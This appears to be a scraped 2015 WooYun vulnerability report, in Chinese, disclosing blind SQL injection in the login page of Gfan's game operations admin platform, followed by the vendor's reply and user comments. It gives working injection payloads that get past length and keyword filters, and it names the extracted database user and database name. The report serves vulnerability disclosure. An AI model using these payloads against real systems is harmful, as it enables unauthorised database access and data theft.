{"id": 1170, "wybug_id": "wooyun-2015-0126382", "wybug_title": "2小时血泪注入篇之机锋网核心平台 Puzzle", "wybug_corp": "机锋网", "wybug_author": "黑暗游侠", "wybug_date": "2015-07-13 08:59", "wybug_open_date": "2015-08-27 09:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向公众公开  简要描述： 2小时血泪注入篇之机锋网核心平台 Puzzle 详细说明：  先来看一下时间\n\n我是3点多的时候发现了这个漏洞的前戏然后从绕过限制到puzzle trick到整个手工测试的结束，也就是现在天亮了漏洞存在系统是机锋网的核心游戏运营平台：\nhttp://admin.tsz.gfan.com/login.php\n\n\n偶然测试发现用户输入admin  admin提示\"账号和密码错误\"输入admin'or'1'='1   admin时候提示\"密码错误\"\n又经过反复测试确认了只有账户处存在注入并且过滤了类似and后面的逻辑，或者运算逻辑配上 \"=\"而且因为带入数据库查询，但是账号尼玛的竟然限制了长度！2-32位长度！！关键字也过滤了部分注释符经过多次测试只有#可以#######反复测试，多次测试，反复测试，多次测试…………\n从3点多到5点半过程不多描述了如何怎么反复测试最后成功的直接给出最后的fuzzing poc：\nusername='or+(select mid(user(),*))>'*'#\n如果正确则response返回一个长度，错误则response返回另一长度前8位比较用技巧get更快\n'or+(select user())>'r'#'or+(select user())>'re'#'or+(select user())>'rea'#'or+(select user())>'read'#'or+(select user())>'reado'#'or+(select user())>'readon'#'or+(select user())>'readonl'#'or+(select user())>'readonly'#\n后面因为超出了32位的长度限制所以用我前面给出的fuzzing poc逐位遍历即可result:\nuser：readonly@192.168.200.100database: tsz_big_db_1\n   漏洞证明：  看在洞主一宿没睡，如此诚意的测试上，15rank给一个吧，洞主也是经常提交关于机锋的漏洞，只不过这次花的时间最多了，与机锋平台共勉。   修复方案：     版权声明：转载请注明来源 黑暗游侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-13 09:06 厂商回复： 谢谢您对机锋安全的关注，这个域名以前说明过，服务器不在机锋这边，这是客户的机器，已经通知客户了，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-13 09:29 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @机锋网 我到现在还没睡着。。刚看到确认了好快，原来是客户机哈，以后会继续关注机锋的！赞这么负责有态度的运维一个！    \n     2015-08-27 10:33 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @黑暗游侠 貌似子非海绵宝宝提过这个 用的是|| &&    \n     2015-08-27 10:35 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  同表 有可能注出pass    \n     2015-08-27 10:38 |    \t\tSnow陈伦 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 闷骚的家伙，何处都是你的战场。)\t\t \n  费了这么大劲儿，居然是client。。。。好好睡一觉吧。    \n     2015-08-27 13:57 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  你也是满拼的，是不是最近失恋了，失眠啊？    \n     2015-08-27 16:54 |    \t\t❤ \t\t\t( 普通白帽子  |\t\t\t        Rank:276 漏洞数:69        | ❤)\t\t \n  这个洞貌似有人提交过没修复吧？我前面也发现了，苦于屌丝不太懂手注。    \n     2015-08-27 22:07 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @BMa 不知道诶    \n     2015-08-27 22:07 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  @sql小神 早就失恋了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}